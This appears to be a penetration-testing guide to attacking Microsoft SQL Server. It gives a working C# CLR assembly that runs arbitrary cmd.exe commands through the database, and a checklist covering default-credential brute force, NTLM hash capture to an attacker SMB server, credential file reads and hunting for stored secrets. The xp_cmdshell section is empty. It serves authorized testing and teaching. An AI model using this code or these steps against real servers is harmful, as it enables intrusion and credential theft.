## Overview

Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It listens on **TCP port 1433** by default and is widely deployed in enterprise Windows environments. MSSQL integrates tightly with Active Directory, supports stored procedures like `xp_cmdshell` for OS command execution, CLR assemblies, linked servers, and impersonation — all creating a massive attack surface during penetration tests.

::card-group
  ::card
  ---
  title: Default Ports
  icon: i-lucide-network
  ---
  `1433` (default instance), `1434/UDP` (SQL Browser), `4022` (Service Broker), dynamic ports for named instances. SQL Browser resolves named instance ports.
  ::

  ::card
  ---
  title: Protocol
  icon: i-lucide-cable
  ---
  Tabular Data Stream (TDS) over TCP. Supported by FreeTDS, `impacket-mssqlclient`, `sqlcmd`, SSMS, and most database drivers.
  ::

  ::card
  ---
  title: Authentication
  icon: i-lucide-lock
  ---
  **Windows Authentication** (Kerberos/NTLM via AD), **SQL Authentication** (username/password), **Mixed Mode** (both). `sa` is the built-in sysadmin account.
  ::

## Exploitation

### xp_cmdshell — OS Command Execution

::warning
`xp_cmdshell` is the most direct method for OS command execution in MSSQL. It requires **sysadmin** privileges and can be enabled even when initially disabled.
::

::tabs

### CLR Assembly Exploitation

::caution
CLR (Common Language Runtime) assemblies allow loading custom .NET code into MSSQL, providing **the most flexible RCE method** with full .NET framework access.

  ```csharp [CmdExec.cs]
  // Compile with:
  // csc /target:library /out:CmdExec.dll CmdExec.cs

  using System;
  using System.Data;
  using System.Data.SqlClient;
  using System.Data.SqlTypes;
  using System.Diagnostics;
  using Microsoft.SqlServer.Server;

  public class StoredProcedures
  {
      [Microsoft.SqlServer.Server.SqlProcedure]
      public static void CmdExec(SqlString cmd)
      {
          Process proc = new Process();
          proc.StartInfo.FileName = "cmd.exe";
          proc.StartInfo.Arguments = "/c " + cmd.Value;
          proc.StartInfo.UseShellExecute = false;
          proc.StartInfo.RedirectStandardOutput = true;
          proc.StartInfo.RedirectStandardError = true;
          proc.Start();

          SqlDataRecord record = new SqlDataRecord(
              new SqlMetaData("output", SqlDbType.NVarChar, 4000));
          SqlContext.Pipe.SendResultsStart(record);

          string line;
          while ((line = proc.StandardOutput.ReadLine()) != null)
          {
              record.SetString(0, line);
              SqlContext.Pipe.SendResultsRow(record);
          }

          proc.WaitForExit();
          SqlContext.Pipe.SendResultsEnd();
      }
  }
  ```

## Pentest Checklist

::steps{level="4"}

#### Discover MSSQL Instances

Scan TCP 1433 and UDP 1434 (SQL Browser). Use Nmap `ms-sql-info` to discover named instances and their dynamic ports.

#### Extract NTLM Information

Use `ms-sql-ntlm-info` to obtain NetBIOS name, domain, FQDN, and OS version without authentication.

#### Test Default and Common Credentials

Try `sa` with blank, `sa`, `password`, `P@ssw0rd`. Use Hydra, CrackMapExec, or Metasploit for automated brute force and password spraying.

#### Determine Privilege Level

Check `IS_SRVROLEMEMBER('sysadmin')` immediately after login. Sysadmin unlocks all exploitation vectors.

#### Enumerate Impersonation Paths

Query `sys.server_permissions` for IMPERSONATE grants. Chain impersonation to reach sysadmin if available.

#### Check Linked Servers

Enumerate linked servers and test privilege level on each. Look for circular links enabling privilege escalation through double-hop.

#### Test xp_cmdshell for RCE

Enable and execute `xp_cmdshell`. If blocked, use OLE Automation, CLR Assembly, or SQL Agent job alternatives.

#### Capture NTLM Hashes

Force authentication to attacker SMB server via `xp_dirtree`, `xp_fileexist`, or `OPENROWSET`. Crack or relay captured hashes.

#### Extract Password Hashes

Query `sys.sql_logins` for SQL authentication hashes. Crack with Hashcat mode 1731 (2012+) or 132 (2005).

#### Read Sensitive Files

Use `OPENROWSET BULK`, `xp_cmdshell type`, or `xp_dirtree` to read web.config, connection strings, and system files.

#### Search for Sensitive Data

Query across all databases for columns containing passwords, tokens, credit cards, SSNs, and API keys.

#### Exploit TRUSTWORTHY Database Escalation

Check `is_trustworthy_on` in `sys.databases`. If db_owner on a TRUSTWORTHY database, escalate to sysadmin.

#### Test SQL Injection Vectors

For web applications, test MSSQL-specific injection with stacked queries, `WAITFOR DELAY`, `CONVERT` errors, and `xp_cmdshell` via injection.

#### Document and Report

Record all findings including weak credentials, sysadmin access, RCE, data exposure, NTLM leaks, linked server abuse, and provide remediation recommendations.

::
